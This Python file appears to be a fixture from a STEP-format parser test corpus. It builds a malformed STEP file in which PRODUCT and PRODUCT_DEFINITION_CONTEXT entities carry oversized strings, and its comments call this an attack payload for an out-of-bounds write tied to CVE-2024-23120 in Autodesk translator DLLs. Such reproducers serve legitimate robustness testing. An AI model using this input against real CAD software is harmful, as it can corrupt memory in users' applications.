"""Ad033 — Translator OOB write copying parsed string into packed C struct.

Catalog claim: vendor-specific translator copies parsed Part-21 strings into
packed struct buffer; field lengths from input not bounds-checked against
destination slot size. CVE-2024-23120 (Autodesk ASMIMPORT*.dll on STP/STEP).

Reproducer recipe: PRODUCT('long_name','long_id','desc',(..))); where
long_name exceeds the translator's struct field.

Byte assertions:
  matches(rb"(?s)PRODUCT\\(\\s*'A{50,}")
  max_string_literal_length >= 100

Tier-3: load == "ok"
Expected: occt=empty/empty gmsh=empty ifc=schema_n/a
"""
from step_corpus.step_builder import StepFile

f = StepFile(
    catalog_id="Ad033",
    defect=(
        "OOB write: PRODUCT name string of 256 'A's overflows packed struct field; "
        "CVE-2024-23120 Autodesk ASMIMPORT*.dll; "
        "GEOMETRIC_CURVE_SET IS model entity — OCC yields empty"
    ),
)

# Silent-accept defect: omit add_product_chain so there is no
# PRODUCT/SHAPE_REPRESENTATION for OCC to construct geometry from. The
# defective DATA bytes remain but OCC yields empty (occt=empty/empty per
# catalog Expected line).
origin = f.cartesian_point((0.0, 0.0, 0.0))
f._emit_raw(f"GEOMETRIC_CURVE_SET('',(#{origin.eid}))")

# Attack payload: PRODUCT with oversized name and id strings.
# 'A' * 256 — satisfies matches(rb"(?s)PRODUCT\(\s*'A{50,}") and
# max_string_literal_length >= 100.
long_name = "A" * 256
long_id = "B" * 128
long_desc = "C" * 128

# PRODUCT(name, id, description, frame_of_reference)
# frame_of_reference is a list of PRODUCT_CONTEXTs; use empty list to keep
# this self-contained (no dependent geometry needed).
f._emit_raw(
    f"PRODUCT('{long_name}','{long_id}','{long_desc}',"
    f"())"
)

# Additional PRODUCT_DEFINITION_CONTEXT with overlong name to hit the same
# struct-copy path in translators that process all header entities.
f._emit_raw(
    f"PRODUCT_DEFINITION_CONTEXT('{long_name}','design')"
)
